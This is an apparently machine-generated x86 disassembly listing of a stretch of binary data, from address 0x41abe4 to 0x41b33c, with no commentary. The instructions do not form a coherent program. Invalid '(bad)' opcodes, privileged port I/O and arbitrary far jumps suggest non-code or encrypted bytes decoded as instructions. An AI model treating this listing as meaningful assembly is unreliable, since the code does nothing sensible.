  41abe4:	jbe    0x41ac3e
  41abe6:	pop    ebp
  41abe7:	fnsave [eax+0x365dc06d]
  41abed:	add    al,0xaf
  41abef:	push   ebp
  41abf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abf1:	dec    edi
  41abf2:	(bad)  
  41abf3:	sti    
  41abf4:	std    
  41abf5:	xchg   ecx,eax
  41abf6:	fwait
  41abf7:	adc    al,0xc2
  41abf9:	popa   
  41abfa:	mov    ch,cl
  41abfc:	inc    edx
  41abfd:	jl     0x41ac45
  41abff:	xchg   ebp,eax
  41ac00:	mov    dl,0x40
  41ac02:	shr    BYTE PTR [ecx+0x12],cl
  41ac05:	pop    edx
  41ac06:	mov    WORD PTR [edx],es
  41ac08:	loop   0x41ac32
  41ac0a:	fucom  st(3)
  41ac0c:	pcmpeqd mm0,QWORD PTR [ebp+0x1c1a593b]
  41ac13:	mov    eax,0x38bc5904
  41ac18:	addr16 inc edx
  41ac1a:	xor    cl,bl
  41ac1c:	sar    al,1
  41ac1e:	inc    eax
  41ac1f:	and    ebx,DWORD PTR [esi+0x5a]
  41ac22:	stc    
  41ac23:	mov    al,ds:0x24f5df4c
  41ac28:	mov    cl,0xf
  41ac2a:	fisubr DWORD PTR [ebx+0x1c]
  41ac2d:	mov    edi,DWORD PTR ss:[ebx+0x76]
  41ac31:	aad    0xb8
  41ac33:	push   eax
  41ac34:	call   0x27b8:0x203e0b00
  41ac3b:	mov    edx,0xfd591d4d
  41ac40:	sbb    eax,0xdadffec4
  41ac45:	aas    
  41ac46:	mov    ebx,0x15175453
  41ac4b:	push   edi
  41ac4c:	mov    WORD PTR [ecx-0x66],ds
  41ac4f:	es xchg ebx,eax
  41ac51:	shr    al,0x4d
  41ac54:	pusha  
  41ac55:	xchg   DWORD PTR [eax-0x64],ebp
  41ac58:	aas    
  41ac59:	fst    QWORD PTR [edx-0x1f]
  41ac5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5d:	test   al,0x6
  41ac5f:	ins    DWORD PTR es:[edi],dx
  41ac60:	adc    edi,0xdb575675
  41ac66:	gs call 0xa8c590c6
  41ac6c:	adc    eax,0x57cadfdc
  41ac71:	lods   al,BYTE PTR ds:[esi]
  41ac72:	out    0xd4,al
  41ac74:	loop   0x41ac91
  41ac76:	sbb    ch,ch
  41ac78:	push   0xffffffb8
  41ac7a:	je     0x41ac08
  41ac7c:	pop    es
  41ac7d:	mov    ebx,0xd888338e
  41ac82:	mov    al,0x3c
  41ac84:	rcr    BYTE PTR [esi],1
  41ac86:	jo     0x41acff
  41ac88:	je     0x41ac53
  41ac8a:	pop    ss
  41ac8b:	and    DWORD PTR ds:0xc8eed4c2,esp
  41ac91:	stc    
  41ac92:	int3   
  41ac93:	and    ah,dh
  41ac95:	in     al,0xcb
  41ac97:	arpl   WORD PTR [ebx],sp
  41ac99:	cld    
  41ac9a:	lds    ebx,FWORD PTR [edi+0xdfc0bd0]
  41aca0:	out    dx,al
  41aca1:	or     cl,BYTE PTR [esi-0x5499f404]
  41aca7:	sub    al,0x64
  41aca9:	mov    al,ds:0x1309474a
  41acae:	(bad)  
  41acaf:	out    0xa8,al
  41acb1:	(bad)  
  41acb2:	clc    
  41acb3:	xchg   ebx,eax
  41acb4:	adc    DWORD PTR [eax],esp
  41acb6:	push   esi
  41acb7:	and    DWORD PTR [esp+eiz*4-0x4c589363],eax
  41acbe:	jo     0x41acb7
  41acc0:	mov    dh,0x2e
  41acc2:	fild   DWORD PTR [edi+0x2889cc75]
  41acc8:	in     eax,0xc9
  41acca:	sbb    dh,BYTE PTR [edx]
  41accc:	xchg   esp,eax
  41accd:	jmp    0x8b08:0x188ec2aa
  41acd4:	retf   0x6bc9
  41acd7:	inc    edi
  41acd8:	out    dx,al
  41acd9:	(bad)  
  41acdb:	out    dx,al
  41acdc:	ret    0xa32b
  41acdf:	ret    0x3f2c
  41ace2:	retf   0xff9b
  41ace5:	cwde   
  41ace6:	and    DWORD PTR [esp+eax*2-0x12],ebx
  41acea:	(bad)  
  41acec:	lock mov eax,ds:0x3e1b45ad
  41acf2:	pop    ecx
  41acf3:	scas   eax,DWORD PTR es:[edi]
  41acf4:	add    al,0xac
  41acf6:	fcmove st,st(1)
  41acf8:	int3   
  41acf9:	mov    BYTE PTR [ecx+0x5b],0x87
  41acfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfe:	and    ebp,ebp
  41ad00:	sbb    al,0x6a
  41ad02:	mov    al,fs:0x6438b03f
  41ad08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad09:	pop    esp
  41ad0a:	xchg   ebp,eax
  41ad0b:	cmp    eax,DWORD PTR [edi+0x5e]
  41ad0e:	(bad)  
  41ad0f:	lods   eax,DWORD PTR ds:[esi]
  41ad10:	out    dx,eax
  41ad11:	sahf   
  41ad12:	jbe    0x41ad63
  41ad14:	loopne 0x41acb8
  41ad16:	push   ds
  41ad17:	jbe    0x41ad86
  41ad19:	call   0xe17b:0x15a473da
  41ad20:	shr    edx,cl
  41ad22:	sub    eax,ebp
  41ad24:	frstor [eax+0x26]
  41ad27:	jae    0x41acf7
  41ad29:	je     0x41acfd
  41ad2b:	fld    DWORD PTR ss:[ecx]
  41ad2e:	mov    ds:0xa7b48a6f,eax
  41ad33:	lds    edi,FWORD PTR [ecx-0x6137dd0d]
  41ad39:	mov    ebp,DWORD PTR [edx-0x595f8e5e]
  41ad3f:	mov    ecx,0xf244b47f
  41ad44:	es jne 0x41ad2d
  41ad47:	mov    bh,0x67
  41ad49:	jnp    0x41ad6b
  41ad4b:	leave  
  41ad4c:	push   edx
  41ad4d:	test   WORD PTR [ebp+0x75],0x4ea1
  41ad53:	in     eax,dx
  41ad54:	xchg   esi,eax
  41ad55:	stos   DWORD PTR es:[edi],eax
  41ad56:	sbb    al,0xf8
  41ad58:	mov    ecx,0x4a4fd73d
  41ad5d:	mov    WORD PTR [edx-0x4b],gs
  41ad60:	inc    ecx
  41ad61:	pusha  
  41ad62:	leave  
  41ad63:	sub    ebp,edi
  41ad65:	mov    dl,0x8
  41ad67:	ret    
  41ad68:	pop    ebp
  41ad69:	ss mov ecx,0x362267e3
  41ad6f:	jns    0x41ad10
  41ad71:	ret    
  41ad72:	xchg   edx,eax
  41ad73:	test   al,0x60
  41ad75:	push   ss
  41ad76:	js     0x41ad63
  41ad78:	mov    ch,0x6b
  41ad7a:	cmp    al,0x49
  41ad7c:	mov    esi,0x34828068
  41ad81:	ficomp WORD PTR [esi-0x33472359]
  41ad87:	mov    ds:0xf350cb0c,al
  41ad8c:	fdiv   QWORD PTR [ebp+0x7f1e0f9c]
  41ad92:	xor    al,0x83
  41ad94:	mov    edi,0x755f980e
  41ad99:	inc    DWORD PTR [esi-0x10]
  41ad9c:	mov    BYTE PTR [edi+edi*8],0x46
  41ada0:	mov    bh,0xcd
  41ada2:	push   edx
  41ada3:	push   ecx
  41ada4:	out    0x10,eax
  41ada6:	stc    
  41ada7:	icebp  
  41ada8:	add    DWORD PTR [ecx],esi
  41adaa:	push   cs
  41adab:	mov    ah,0x99
  41adad:	cs sbb al,0x36
  41adb0:	rol    BYTE PTR [esi-0x51405344],cl
  41adb6:	leave  
  41adb7:	scas   al,BYTE PTR es:[edi]
  41adb8:	mov    ebx,0x778c995f
  41adbd:	int3   
  41adbe:	or     DWORD PTR [eax],esi
  41adc0:	shl    ebp,1
  41adc2:	cmp    ebp,edx
  41adc4:	jmp    0x7c5a:0x697f21ef
  41adcb:	pop    esi
  41adcc:	ret    
  41adcd:	addr16 retf 
  41adcf:	adc    BYTE PTR [ebx-0x590cb451],bh
  41add5:	jmp    0x84b0:0x1b6e440d
  41addc:	repnz xchg ecx,eax
  41adde:	or     al,0x20
  41ade0:	(bad)  
  41ade1:	push   ebp
  41ade2:	(bad)  
  41ade3:	cmp    BYTE PTR [eax+0x6d51b6f6],ch
  41ade9:	ret    
  41adea:	and    dl,BYTE PTR [esi]
  41adec:	(bad)  
  41adee:	adc    bl,ah
  41adf0:	lahf   
  41adf1:	xchg   ecx,eax
  41adf2:	or     al,0x35
  41adf4:	ret    
  41adf5:	gs mov bl,0x37
  41adf8:	std    
  41adf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adfa:	pusha  
  41adfb:	adc    BYTE PTR [ebx-0x5eaab1ed],0x61
  41ae02:	mov    BYTE PTR [ebp+0x1],0x22
  41ae06:	rcr    DWORD PTR [edx],1
  41ae08:	and    al,0x9a
  41ae0a:	idiv   DWORD PTR [edx]
  41ae0c:	or     al,0xb1
  41ae0e:	adc    eax,DWORD PTR cs:[ecx+0x7c]
  41ae12:	out    dx,eax
  41ae13:	call   0xb05cdff8
  41ae18:	retf   0xf561
  41ae1b:	aas    
  41ae1c:	cs (bad) 
  41ae1e:	cvttps2pi mm0,QWORD PTR [eax+eiz*1+0x60]
  41ae23:	push   0xadf0de4b
  41ae28:	mov    ebx,DWORD PTR [edi+eiz*4]
  41ae2b:	mov    bl,0x4f
  41ae2d:	or     DWORD PTR [edx+0x57],esp
  41ae30:	mov    esi,0x7f5bd139
  41ae35:	push   ebx
  41ae36:	dec    ecx
  41ae37:	sti    
  41ae38:	loope  0x41ae42
  41ae3a:	lock sar BYTE PTR [ebp-0x22],1
  41ae3e:	inc    eax
  41ae3f:	lahf   
  41ae40:	outs   dx,BYTE PTR ds:[esi]
  41ae41:	or     DWORD PTR [ebx-0x7b],edi
  41ae44:	xchg   DWORD PTR [ecx-0x5],esp
  41ae47:	pushf  
  41ae48:	pop    edi
  41ae49:	dec    esp
  41ae4a:	lahf   
  41ae4b:	jmp    0x4b5a:0x870c0f17
  41ae52:	xor    al,0xaf
  41ae54:	rcr    BYTE PTR [esi-0x46],0xea
  41ae58:	inc    ebx
  41ae59:	sub    dh,bh
  41ae5b:	jmp    0xa512:0xfaa22a18
  41ae62:	sti    
  41ae63:	add    al,BYTE PTR [eax+0x711e04fa]
  41ae69:	mov    cl,0x26
  41ae6b:	sbb    dl,ah
  41ae6d:	cld    
  41ae6e:	nop
  41ae6f:	and    DWORD PTR [ebp+0x11c73ad7],ecx
  41ae75:	repz dec esi
  41ae77:	jmp    0x42b71dc5
  41ae7c:	mov    fs,edi
  41ae7e:	sbb    ch,bh
  41ae80:	add    DWORD PTR [edi+0x20],ecx
  41ae83:	scas   al,BYTE PTR es:[edi]
  41ae84:	push   edi
  41ae85:	mov    ecx,0xf02ce779
  41ae8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8c:	and    bl,BYTE PTR [eax]
  41ae8e:	or     DWORD PTR [ecx-0x66],edi
  41ae91:	outs   dx,BYTE PTR ds:[esi]
  41ae92:	pop    eax
  41ae93:	or     al,0x9d
  41ae95:	inc    esi
  41ae96:	mov    ebp,0x5726dc84
  41ae9b:	fdiv   DWORD PTR [edx-0x1744223c]
  41aea1:	xchg   edi,eax
  41aea2:	es jg  0x41aeac
  41aea5:	(bad)  
  41aea7:	(bad)  
  41aea8:	jae    0x41ae77
  41aeaa:	retf   0x3d2c
  41aead:	jmp    0x1313c58b
  41aeb2:	mov    bh,0xd3
  41aeb4:	lea    ecx,[esi]
  41aeb6:	jne    0x41aeb5
  41aeb8:	add    BYTE PTR [edi-0x39c3fc68],cl
  41aebe:	xor    al,BYTE PTR [esi-0x26]
  41aec1:	aaa    
  41aec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec3:	or     dl,al
  41aec5:	call   0x1ad3c435
  41aeca:	sbb    edi,DWORD PTR [eax+ebx*1+0x17a30322]
  41aed1:	adc    eax,DWORD PTR [edi]
  41aed3:	xchg   edi,eax
  41aed4:	sub    esi,DWORD PTR [eax-0x17]
  41aed7:	and    al,0x95
  41aed9:	lahf   
  41aeda:	dec    edx
  41aedb:	sub    ebp,DWORD PTR [edi-0x257d8e7]
  41aee1:	imul   esi,DWORD PTR [edi+ebp*8-0x37],0xffffffaf
  41aee6:	out    0xf7,al
  41aee8:	test   ecx,edi
  41aeea:	ret    0x87aa
  41aeed:	and    ecx,DWORD PTR [esi+0x4735794]
  41aef3:	cmp    ebp,edx
  41aef5:	sbb    eax,edx
  41aef7:	mov    DWORD PTR [edx],edi
  41aef9:	dec    ebx
  41aefa:	push   es
  41aefb:	stc    
  41aefc:	xchg   ebp,eax
  41aefd:	(bad)  
  41aefe:	dec    edx
  41aeff:	les    ebp,FWORD PTR [eax+0xeb06f8d]
  41af05:	jns    0x41af17
  41af07:	jb     0x41aedd
  41af09:	mov    ebx,0x6aa7a9e3
  41af0e:	and    eax,0xb7e7e5a0
  41af13:	nop
  41af14:	cmp    ebx,DWORD PTR [eax-0x63]
  41af17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af18:	or     al,0x98
  41af1a:	mov    dl,0x28
  41af1c:	xchg   edi,eax
  41af1d:	or     ch,dh
  41af1f:	pushf  
  41af20:	test   DWORD PTR [esi-0x12],ebp
  41af23:	inc    DWORD PTR [edx-0x18e22562]
  41af29:	adc    dh,BYTE PTR [ecx]
  41af2b:	sbb    eax,0x8bc2c6dd
  41af30:	nop
  41af31:	mov    cl,0xa1
  41af33:	clc    
  41af34:	leave  
  41af35:	or     al,0xbe
  41af37:	loopne 0x41aeef
  41af39:	sub    ecx,0xa83bb36b
  41af3f:	in     al,dx
  41af40:	xchg   ecx,eax
  41af41:	or     edi,esp
  41af43:	rcl    BYTE PTR [ebx],0x27
  41af46:	mov    eax,ds:0x504c9b72
  41af4b:	fwait
  41af4c:	out    0x60,al
  41af4e:	xor    ebp,ecx
  41af50:	sub    eax,0xc5e7d30d
  41af55:	test   BYTE PTR [ebx-0x30302ccc],0xf4
  41af5c:	jl     0x41afa0
  41af5e:	mov    ebp,0xa9fef53c
  41af63:	pusha  
  41af64:	shr    bh,1
  41af66:	mov    ebx,0x5a014a03
  41af6b:	push   eax
  41af6c:	cmp    DWORD PTR [ebp-0x5aafe6d8],eax
  41af72:	mov    edi,0x4709f4f7
  41af77:	xchg   esi,eax
  41af78:	mov    ebx,0x30a49252
  41af7d:	dec    esi
  41af7e:	out    0x45,eax
  41af80:	sbb    eax,0xf0060c4d
  41af85:	imul   edx,DWORD PTR [esi],0xfffffff6
  41af88:	sar    ch,0x85
  41af8b:	sbb    al,0x7d
  41af8d:	cld    
  41af8e:	or     dh,BYTE PTR [ecx]
  41af90:	push   0x1c88443d
  41af95:	daa    
  41af96:	clc    
  41af97:	data16 fadd st,st(7)
  41af9a:	jae    0x41afe3
  41af9c:	mov    dh,BYTE PTR [ebx]
  41af9e:	xor    al,0x52
  41afa0:	adc    eax,0x92778a8
  41afa5:	add    BYTE PTR [esp+eiz*4],0xe5
  41afa9:	xor    ah,BYTE PTR [esi]
  41afab:	mov    WORD PTR [edi],?
  41afad:	dec    ebx
  41afae:	add    ebp,DWORD PTR [eax-0x4d8e402]
  41afb4:	add    DWORD PTR [ebx],eax
  41afb6:	or     eax,0xaccea00c
  41afbb:	outs   dx,DWORD PTR ds:[esi]
  41afbc:	ret    
  41afbd:	outs   dx,BYTE PTR ds:[esi]
  41afbe:	arpl   WORD PTR [ecx],dx
  41afc0:	sub    al,0x6d
  41afc2:	dec    esi
  41afc3:	mov    esi,0xa627a018
  41afc8:	adc    DWORD PTR [ebp+0x1d15a0e5],esi
  41afce:	xor    al,0x2
  41afd0:	lea    ecx,[eax-0x6ee2c16b]
  41afd6:	pop    esp
  41afd7:	push   esp
  41afd8:	jmp    0x8e27:0x63f4b478
  41afdf:	repnz and eax,0xe4ae549c
  41afe5:	cs test dl,bh
  41afe8:	dec    ebp
  41afe9:	lods   eax,DWORD PTR ds:[esi]
  41afea:	cmp    ch,BYTE PTR [edi]
  41afec:	data16 int 0xf3
  41afef:	pop    ebp
  41aff0:	mov    eax,ds:0x9631f2f0
  41aff5:	add    BYTE PTR [ebp+0x38aa4b6a],ch
  41affb:	jp     0x41b052
  41affd:	icebp  
  41affe:	mov    ch,0xd5
  41b000:	xlat   BYTE PTR ds:[ebx]
  41b001:	fidiv  WORD PTR [eax-0x34]
  41b004:	or     DWORD PTR [edi],edi
  41b006:	stos   DWORD PTR es:[edi],eax
  41b007:	clc    
  41b008:	pop    ss
  41b009:	jno    0x41b077
  41b00b:	scas   al,BYTE PTR es:[edi]
  41b00c:	es (bad) 
  41b00e:	pop    ds
  41b00f:	lods   eax,DWORD PTR ds:[esi]
  41b010:	xchg   edi,eax
  41b011:	cmp    bh,0x88
  41b014:	neg    BYTE PTR [ecx-0x63]
  41b017:	mov    esi,0xb8ec1cb4
  41b01c:	rcl    BYTE PTR [edi],1
  41b01e:	(bad)  
  41b021:	inc    esp
  41b022:	retf   0x22d6
  41b025:	mov    BYTE PTR [ecx],al
  41b027:	dec    esp
  41b028:	mov    ecx,0x8b0628a3
  41b02d:	pop    ebp
  41b02e:	mov    dl,0x25
  41b030:	sub    BYTE PTR [eax],dl
  41b032:	push   esp
  41b033:	mov    ah,0x81
  41b035:	mov    esp,0xf0fa5af9
  41b03a:	retf   
  41b03b:	arpl   ax,sp
  41b03d:	pop    ebp
  41b03e:	data16 (bad) 
  41b041:	lahf   
  41b042:	cmp    al,0x9a
  41b044:	push   edx
  41b045:	dec    edx
  41b046:	pusha  
  41b047:	repz xor DWORD PTR [eax],0x6ae94999
  41b04e:	push   0x14
  41b050:	add    al,0xd2
  41b052:	xor    edi,eax
  41b054:	fnstenv [edx+0x7e]
  41b057:	je     0x41b011
  41b059:	int3   
  41b05a:	sbb    ah,ch
  41b05c:	in     eax,0x63
  41b05e:	inc    BYTE PTR [ebx+0x69bffd39]
  41b064:	dec    ecx
  41b065:	jmp    0x41b081
  41b067:	dec    eax
  41b068:	add    al,0x1d
  41b06a:	dec    esi
  41b06b:	xor    edi,DWORD PTR [edi+0x4b]
  41b06e:	dec    ecx
  41b06f:	jne    0x41b056
  41b071:	mov    ecx,0x7c4cfacc
  41b076:	lods   al,BYTE PTR ds:[esi]
  41b077:	je     0x41b021
  41b079:	leave  
  41b07a:	pop    eax
  41b07b:	xor    ecx,esi
  41b07d:	adc    ah,BYTE PTR [edx]
  41b07f:	cmp    esi,DWORD PTR [eax+0x1c8b973]
  41b085:	lahf   
  41b086:	std    
  41b087:	mov    edi,0xefa03d90
  41b08c:	rcl    BYTE PTR [eax+0x54],0xd7
  41b090:	ins    DWORD PTR es:[edi],dx
  41b091:	lds    ecx,FWORD PTR [edi-0x5a]
  41b094:	adc    eax,0xbd4025f3
  41b099:	inc    esi
  41b09a:	(bad)  
  41b09b:	mov    dh,0xe6
  41b09d:	adc    BYTE PTR [ebx+0x28],cl
  41b0a0:	cs mov ah,0x43
  41b0a3:	add    esp,DWORD PTR [eax+0x16]
  41b0a6:	mov    eax,0xb09a7aaf
  41b0ab:	pusha  
  41b0ac:	fdiv   st(3),st
  41b0ae:	mov    BYTE PTR [eax+ebx*4+0x2feaa415],cl
  41b0b5:	dec    esp
  41b0b6:	popf   
  41b0b7:	adc    al,0x24
  41b0b9:	cmp    eax,0x797eb075
  41b0be:	(bad)  
  41b0c0:	sar    BYTE PTR [edx],1
  41b0c2:	inc    ecx
  41b0c3:	out    dx,eax
  41b0c4:	fwait
  41b0c5:	add    edx,DWORD PTR [ebp+0x18cfdedb]
  41b0cb:	push   eax
  41b0cc:	push   edx
  41b0cd:	test   al,0xb6
  41b0cf:	mov    cl,0xdd
  41b0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d2:	xchg   edi,ecx
  41b0d4:	icebp  
  41b0d5:	je     0x41b079
  41b0d7:	lods   al,BYTE PTR ds:[esi]
  41b0d8:	fstp   TBYTE PTR [eax]
  41b0da:	mov    ecx,0x5fae2608
  41b0df:	jbe    0x41b062
  41b0e1:	jmp    0x3564:0xe9a66058
  41b0e8:	pop    ss
  41b0e9:	pop    ecx
  41b0ea:	mov    ch,0xed
  41b0ec:	push   esi
  41b0ed:	jb     0x41b13b
  41b0ef:	add    al,0x74
  41b0f1:	xchg   edx,eax
  41b0f2:	dec    ebp
  41b0f3:	enter  0x3ec8,0x7a
  41b0f7:	and    al,0xbe
  41b0f9:	pop    ds
  41b0fa:	pop    es
  41b0fb:	int3   
  41b0fc:	xlat   BYTE PTR ds:[ebx]
  41b0fd:	xor    al,0xf
  41b0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b100:	ins    BYTE PTR es:[edi],dx
  41b101:	xchg   ebx,esp
  41b103:	in     al,0xba
  41b105:	gs test al,0x5a
  41b108:	sbb    ah,BYTE PTR [ecx+0x65b97d8c]
  41b10e:	xchg   edx,eax
  41b10f:	inc    eax
  41b110:	xchg   ebx,eax
  41b111:	les    esi,FWORD PTR [eax-0x2a3a5d7f]
  41b117:	mov    eax,0xd48df0a5
  41b11c:	xchg   ebx,eax
  41b11d:	iret   
  41b11e:	pop    esi
  41b11f:	aam    0x34
  41b121:	mov    ah,0x5d
  41b123:	push   cs
  41b124:	scas   eax,DWORD PTR es:[edi]
  41b125:	sahf   
  41b126:	add    al,0x98
  41b128:	adc    BYTE PTR [ecx],cl
  41b12a:	adc    al,0x6e
  41b12c:	jg     0x41b141
  41b12e:	adc    dl,ah
  41b130:	fiadd  DWORD PTR [edi+0x4826ffa0]
  41b136:	fwait
  41b137:	push   eax
  41b138:	mov    ax,0x47d0
  41b13c:	int3   
  41b13d:	cmp    BYTE PTR [ebx+ecx*1],al
  41b140:	lods   eax,DWORD PTR ds:[esi]
  41b141:	adc    eax,0xac66ee8e
  41b146:	cmp    BYTE PTR [ebp+0x4b7272ab],dl
  41b14c:	stos   BYTE PTR es:[edi],al
  41b14d:	mov    DWORD PTR [edi-0xeae85e4],esi
  41b153:	lahf   
  41b154:	pop    ds
  41b155:	ja     0x41b189
  41b157:	inc    esp
  41b158:	fwait
  41b159:	popa   
  41b15a:	adc    DWORD PTR [edi-0x5bf90422],edx
  41b160:	add    eax,0x6e8da2f6
  41b165:	sbb    BYTE PTR [edx+0x1c7706b5],al
  41b16b:	xchg   edx,eax
  41b16c:	jo     0x41b17f
  41b16e:	(bad)
  41b171:	sar    eax,1
  41b173:	das    
  41b174:	aaa    
  41b175:	cmp    esp,DWORD PTR ss:[edi-0x2cb847b6]
  41b17c:	push   ecx
  41b17d:	cwde   
  41b17e:	repz inc ebx
  41b180:	jae    0x41b1b7
  41b182:	mov    bl,0xa8
  41b184:	jmp    0x7c0aa196
  41b189:	js     0x41b1f0
  41b18b:	mov    ah,ah
  41b18d:	jmp    0xd687:0xeb1785f9
  41b194:	xchg   edx,ebp
  41b196:	xchg   esi,eax
  41b197:	fwait
  41b198:	ins    DWORD PTR es:[edi],dx
  41b199:	loope  0x41b171
  41b19b:	mov    edi,0x62872aaf
  41b1a0:	inc    esi
  41b1a1:	enter  0x48d8,0x46
  41b1a5:	add    al,0x2d
  41b1a7:	hlt    
  41b1a8:	lahf   
  41b1a9:	xor    ah,BYTE PTR [edi-0x56]
  41b1ac:	addr16 and al,0x13
  41b1af:	ja     0x41b20d
  41b1b1:	ret    0x72a1
  41b1b4:	(bad)  
  41b1b5:	(bad)  
  41b1b7:	out    dx,al
  41b1b8:	gs aam 0xdf
  41b1bb:	lock and DWORD PTR es:[eax-0x49ae59cd],ebx
  41b1c3:	jnp    0x41b18d
  41b1c5:	cmp    DWORD PTR [edx+0x45],edi
  41b1c8:	or     dl,BYTE PTR [ebp+0x2c34cf83]
  41b1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1cf:	pop    esp
  41b1d0:	pop    ds
  41b1d1:	mov    dh,0xe6
  41b1d3:	or     al,0xc1
  41b1d5:	push   esi
  41b1d6:	mov    edx,0xde68a712
  41b1db:	xchg   ebx,eax
  41b1dc:	inc    ebp
  41b1dd:	popa   
  41b1de:	pusha  
  41b1df:	(bad)  
  41b1e0:	sti    
  41b1e1:	rcl    BYTE PTR [edx],1
  41b1e3:	mov    ebp,cs
  41b1e5:	cmp    al,0x6d
  41b1e7:	or     ebp,DWORD PTR [esi]
  41b1e9:	gs inc edx
  41b1eb:	bound  ebp,QWORD PTR [eax+0x69]
  41b1ee:	sahf   
  41b1ef:	push   es
  41b1f0:	loopne 0x41b238
  41b1f2:	xor    eax,0x8a9ade1b
  41b1f7:	aad    0x63
  41b1f9:	xor    DWORD PTR [ebp+0x6e],ebp
  41b1fc:	inc    ebx
  41b1fd:	ja     0x41b24a
  41b1ff:	in     eax,dx
  41b200:	mov    al,0x7b
  41b202:	jnp    0x41b1cc
  41b204:	test   al,0x44
  41b206:	(bad)  
  41b207:	(bad)
  41b20a:	bound  ebx,QWORD PTR [ebp-0x42beed11]
  41b210:	inc    BYTE PTR [edi+0xd]
  41b213:	xchg   BYTE PTR [ebx+0x78954bbd],bl
  41b219:	xchg   ecx,eax
  41b21a:	and    al,0x1e
  41b21c:	add    eax,0x674b2b8f
  41b221:	pop    edx
  41b222:	sub    ah,BYTE PTR [esi]
  41b224:	cmp    esp,DWORD PTR [esi-0x40]
  41b227:	pop    ss
  41b228:	into   
  41b229:	xchg   edx,eax
  41b22a:	loopne 0x41b1bc
  41b22c:	inc    ecx
  41b22d:	clc    
  41b22e:	loope  0x41b2a2
  41b230:	ds in  al,dx
  41b232:	push   ds
  41b233:	fistp  QWORD PTR [esi]
  41b235:	cmp    eax,0x8b78603e
  41b23a:	xchg   esp,eax
  41b23b:	rol    edi,cl
  41b23d:	cmp    al,0x5e
  41b23f:	popf   
  41b240:	dec    ebp
  41b241:	loope  0x41b259
  41b243:	dec    ch
  41b245:	cmp    bh,BYTE PTR [edx+0x401f6ef9]
  41b24b:	outs   dx,BYTE PTR ds:[esi]
  41b24c:	xchg   BYTE PTR [ebx+0x331a6c86],dh
  41b252:	(bad)  
  41b253:	xor    BYTE PTR [eax],dl
  41b255:	xor    eax,0x3028ecd
  41b25a:	les    edx,FWORD PTR [eax-0x38]
  41b25d:	adc    dh,dl
  41b25f:	lea    esp,[ebx]
  41b261:	xor    eax,0xc5d8c709
  41b266:	push   ebx
  41b267:	aas    
  41b268:	ret    
  41b269:	fnstcw WORD PTR [ecx+0xd]
  41b26c:	and    eax,ebp
  41b26e:	retf   
  41b26f:	dec    ebp
  41b270:	jnp    0x41b2ca
  41b272:	push   eax
  41b273:	xlat   BYTE PTR fs:[ebx]
  41b275:	mov    esp,0x5246f516
  41b27a:	and    al,0x1c
  41b27c:	pop    edx
  41b27d:	(bad)  
  41b27e:	pop    ss
  41b27f:	(bad)  
  41b280:	xchg   ebp,eax
  41b281:	imul   esi,DWORD PTR [ebp-0x59],0x5fd7c69e
  41b288:	cmp    al,0xf7
  41b28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b28b:	xor    BYTE PTR ds:0xdc639964,dh
  41b291:	sbb    al,0x43
  41b294:	mov    eax,ds:0x48d17d1d
  41b299:	mov    ecx,0x224a50e2
  41b29e:	fnsave [ebx]
  41b2a0:	je     0x41b254
  41b2a2:	scas   eax,DWORD PTR es:[edi]
  41b2a3:	fwait
  41b2a4:	and    DWORD PTR [edx+0x72],eax
  41b2a7:	dec    ebp
  41b2a8:	das    
  41b2a9:	push   0xffffffdb
  41b2ab:	out    0x13,al
  41b2ad:	lods   al,BYTE PTR ds:[esi]
  41b2ae:	pop    esp
  41b2af:	mov    ds:0x9380002c,al
  41b2b4:	or     BYTE PTR [ebx],dl
  41b2b6:	jne    0x41b2f8
  41b2b8:	sar    DWORD PTR [ebx],1
  41b2ba:	les    edx,FWORD PTR [esi-0x7e19a838]
  41b2c0:	dec    ebx
  41b2c1:	push   es
  41b2c2:	xlat   BYTE PTR ds:[ebx]
  41b2c3:	cmp    edi,edi
  41b2c5:	inc    eax
  41b2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2c7:	addr16 iret 
  41b2c9:	xchg   DWORD PTR [eax],ebx
  41b2cb:	call   FWORD PTR [ecx]
  41b2cd:	mov    ?,esi
  41b2cf:	cmp    ch,ch
  41b2d1:	pop    ebp
  41b2d2:	push   cs
  41b2d3:	lahf   
  41b2d4:	jmp    0x42bf:0x2d0afdd0
  41b2db:	mov    esp,0x515cdf50
  41b2e0:	repz jnp 0x41b26a
  41b2e3:	xchg   DWORD PTR [esi-0x6131c933],eax
  41b2e9:	sbb    BYTE PTR [edx+edx*4],bl
  41b2ec:	mov    al,ds:0x971f00c2
  41b2f1:	dec    edi
  41b2f2:	mov    al,ds:0x76366f82
  41b2f7:	outs   dx,DWORD PTR ds:[esi]
  41b2f8:	std    
  41b2f9:	dec    ebx
  41b2fa:	stos   BYTE PTR es:[edi],al
  41b2fb:	sbb    ecx,DWORD PTR [esi]
  41b2fd:	ret    0x18ec
  41b300:	lods   eax,DWORD PTR ds:[esi]
  41b301:	ja     0x41b361
  41b303:	leave  
  41b304:	mov    ebp,0x85c995c8
  41b309:	sbb    al,0x6e
  41b30b:	adc    DWORD PTR [eax+0x56],edi
  41b30e:	fdiv   QWORD PTR [ecx-0x73f9d271]
  41b314:	outs   dx,BYTE PTR ds:[esi]
  41b315:	mov    edx,0x69b56192
  41b31a:	push   cs
  41b31b:	mov    eax,0x3f6c150
  41b320:	dec    edx
  41b321:	cdq    
  41b322:	jmp    0x868ec8bc
  41b327:	mov    DWORD PTR [edi],esp
  41b329:	cmp    bh,BYTE PTR [esi+0x79]
  41b32c:	inc    ebp
  41b32d:	shl    BYTE PTR [edi+0x26e0e4fe],1
  41b333:	sub    BYTE PTR [edi],ah
  41b335:	pop    ss
  41b336:	adc    ah,BYTE PTR [ebp-0x553f95fe]
  41b33c:	out    dx,al
